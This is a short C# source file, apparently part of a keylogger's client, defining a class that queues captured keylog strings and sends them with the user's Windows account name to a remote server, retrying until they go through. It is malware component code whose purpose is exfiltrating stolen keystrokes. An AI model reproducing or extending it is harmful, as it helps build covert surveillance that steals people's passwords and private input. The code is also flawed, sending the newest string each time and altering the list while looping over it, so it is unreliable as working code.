using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Communication
{
    /// <summary>
    /// A class that stacks Keylog send requests incase they didn't send to the server.
    /// </summary>
    public class String_Stacker
    {
        private List<string> _sdata = new List<string>();
        public async void Send(string sdata)
        {
            await Task.Run(() =>
            {
                _sdata.Add(sdata);

                /// Make sure they are sent in order.
                foreach (var i in _sdata)
                {
                    if (Server.AsyncSendKeylogs(sdata, Environment.UserName).Result)
                    {
                        _sdata.Remove(i);
                    }
                    /// Didn't send, maybe try in the next request.
                    else break;
                }
            });
        }
    }
}
